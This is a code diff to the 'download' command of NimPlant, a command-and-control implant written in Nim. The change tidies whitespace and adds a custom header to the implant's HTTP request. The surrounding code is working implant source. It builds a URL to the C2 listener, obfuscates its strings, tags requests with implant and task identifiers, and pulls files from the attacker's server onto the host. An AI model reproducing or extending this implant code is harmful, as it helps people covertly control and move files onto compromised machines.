@@ -7,7 +7,7 @@ from ../util/crypto import encryptData
 # Upload a file from the C2 server to NimPlant
 # From NimPlant's perspective this is similar to wget, but calling to the C2 server instead
 proc download*(li : Listener, cmdGuid : string,  args : varargs[string]) : string =
-    var 
+    var
         filePath : string
         file : string
         url : string
@@ -19,7 +19,7 @@ proc download*(li : Listener, cmdGuid : string,  args : varargs[string]) : strin
         # Handling of the first argument (filename) should be done done by the python server
         result = obf("Invalid number of arguments received. Usage: 'download [remote file] <optional: local destination path>'.")
         return
-    
+
     # Construct the URL to upload the file to
     url = toLowerAscii(li.listenerType) & obf("://")
     if li.listenerHost != "":
@@ -44,12 +44,13 @@ proc download*(li : Listener, cmdGuid : string,  args : varargs[string]) : strin
             Header(key: obf("User-Agent"), value: li.userAgent),
             Header(key: obf("Content-Encoding"), value: obf("gzip")),
             Header(key: obf("X-Identifier"), value: li.id), # Nimplant ID
-            Header(key: obf("X-Unique-ID"), value: cmdGuid)  # Task GUID
+            Header(key: obf("X-Unique-ID"), value: cmdGuid),  # Task GUID
+            Header(key: obf("X-Header"), value: li.customHeaderOne)
         ],
         body: file
     )
 
     # Get the file - Puppy will take care of transparent gzip deflation
     res = fetch(req)
-    
+
     result = "" # Server will know when the file comes in successfully or an error occurred
